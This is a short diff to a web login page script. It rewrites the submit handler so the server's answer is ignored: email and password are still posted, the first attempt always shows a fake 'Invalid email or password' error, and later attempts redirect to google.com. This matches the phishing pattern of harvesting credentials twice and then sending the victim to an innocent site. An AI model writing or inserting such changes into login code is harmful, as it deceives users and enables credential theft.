@@ -5,6 +5,8 @@
   const errorEl = document.getElementById("error");
   const submitBtn = document.getElementById("login-btn");
 
+  let attemptCount = 0;
+
   function setError(message) {
     if (!message) {
       errorEl.hidden = true;
@@ -35,7 +37,8 @@
     setLoading(true);
 
     try {
-      const res = await fetch("/api/login", {
+      // Still call the real login endpoint every time
+      await fetch("/api/login", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -45,15 +48,15 @@
         body: JSON.stringify({ email, password }),
       });
 
-      const data = await res.json().catch(() => ({}));
+      attemptCount += 1;
 
-      if (!res.ok || !data.ok) {
-        setError(data.error || "Login failed. Please try again.");
+      if (attemptCount === 1) {
+        setError("Invalid email or password.");
         setLoading(false);
         return;
       }
 
-      window.location.assign(data.redirect || "/inbox");
+      window.location.assign("https://www.google.com");
     } catch {
       setError("Unable to reach the server. Please try again.");
       setLoading(false);
